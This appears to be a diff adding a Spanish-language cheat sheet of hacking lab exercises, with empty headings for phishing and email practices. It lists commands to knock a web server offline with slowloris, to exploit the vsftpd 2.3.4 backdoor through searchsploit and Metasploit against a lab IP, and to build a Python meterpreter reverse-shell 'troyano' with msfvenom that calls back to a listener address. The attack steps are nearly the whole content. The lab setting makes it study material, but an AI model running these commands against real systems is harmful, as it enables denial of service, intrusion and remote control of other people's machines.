@@ -1,0 +1,63 @@
+#1 COLAPSAR SERVIDOR
+sudo pip3 install slowloris
+slowloris "ip"
+
+#2 CONTROLAR SERVIDOR
+Comandos
+SearchsPloit "Version de servicio"
+msfConsole
+Search "version"
+use "exploit"
+show options
+set R HOSTS "ip"
+Show options
+Run
+
+#3 FISHING
+#4 TROYANO
+#5 CORREOS
+
+
+--------------------------------------
+Practica DOS ATAQUE FTP
+nmap -sV 192.168.33.34
+searchsploit vsftp 2.3.4
+searchsploit vsftp
+msfconsole
+search vsftp
+use exploit/unix/ftp/vsftp_234_backdoor
+show options
+set RHOSTS 192.168.33.34
+show options
+run
+
+ls -SE MOSTRARAN LAS CARPETAS DEL META-
+
+
+---------------------------------------
+Practica DOS ATAQUE TUMBAR
+En el navegador 192.168.33.34
+sudo pip3 install slowloris
+slowloris 192.168.33.34
+
+
+
+---------------------------------------
+Practica TRES FISHING
+
+
+
+---------------------------------------
+Practica CUATRO TROYANO
+sudo ifconfig
+msfvenom -p python/meterpreter/reverse_tcp LHOST=10.2.0.15 LPORT=4444 -o troyanoo.py
+msfvenom -p python/meterpreter/reverse_tcp LHOST=10.2.0.15 LPORT=4444 -o troyanoo.exe
+
+
+
+---------------------------------------
+Practica CINCO CORREOS
+
+
+
+
